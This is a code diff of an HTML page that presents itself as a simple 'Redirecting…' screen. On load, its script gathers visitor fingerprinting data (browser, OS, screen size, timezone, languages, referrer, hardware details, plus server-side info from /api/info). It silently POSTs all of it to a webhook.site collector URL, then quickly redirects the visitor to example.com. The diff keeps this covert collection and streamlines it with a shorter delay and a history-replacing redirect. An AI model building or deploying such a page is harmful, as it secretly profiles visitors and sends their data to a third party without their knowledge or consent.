@@ -1,26 +1,15 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Redirecting...</title>
-  <style>
-    body {
-      background: #111;
-      color: #0f0;
-      font-family: monospace;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-  </style>
+  <title>Redirecting…</title>
+
+  <meta http-equiv="refresh" content="2;url=https://example.com">
 </head>
 <body>
-  <div>Redirecting...</div>
-
   <script>
-    const WEBHOOK_URL = "https://webhook.site/5c51d1ab-3a36-41a6-871c-d06526fa191d";
     const REDIRECT_URL = "https://example.com";
+    const WEBHOOK_URL  = "https://webhook.site/5c51d1ab-3a36-41a6-871c-d06526fa191d";
 
     function getBrowserInfo() {
       const ua = navigator.userAgent;
@@ -46,45 +35,41 @@
         const serverData = await fetch("/api/info").then(r => r.json());
         const { browser, os } = getBrowserInfo();
 
-        const clientData = {
-          browser,
-          os,
-          screen: {
-            width: screen.width,
-            height: screen.height,
-            color_depth: screen.colorDepth
-          },
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          language: navigator.language,
-          languages: navigator.languages,
-          cookies_enabled: navigator.cookieEnabled,
-          online: navigator.onLine,
-          referrer: document.referrer || "None",
-          device_memory_gb: navigator.deviceMemory || "Unknown",
-          cpu_cores: navigator.hardwareConcurrency || "Unknown",
-          platform: navigator.platform,
-          local_time: new Date().toString()
-        };
-
-        const finalData = {
+        const payload = {
           ...serverData,
-          client: clientData
+          client: {
+            browser,
+            os,
+            platform: navigator.platform,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            languages: navigator.languages,
+            screen: {
+              width: screen.width,
+              height: screen.height,
+              color_depth: screen.colorDepth
+            },
+            cookies_enabled: navigator.cookieEnabled,
+            online: navigator.onLine,
+            device_memory_gb: navigator.deviceMemory || "Unknown",
+            cpu_cores: navigator.hardwareConcurrency || "Unknown",
+            referrer: document.referrer || "None",
+            local_time: new Date().toString()
+          }
         };
-        if (WEBHOOK_URL && WEBHOOK_URL.startsWith("http")) {
+        if (WEBHOOK_URL.startsWith("http")) {
           fetch(WEBHOOK_URL, {
             method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(finalData)
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
           }).catch(() => {});
         }
 
       } catch (e) {
-      }
+       }
       setTimeout(() => {
-        window.location.href = REDIRECT_URL;
-      }, 800);
+        window.location.replace(REDIRECT_URL);
+      }, 300);
     }
 
     collectAndRedirect();
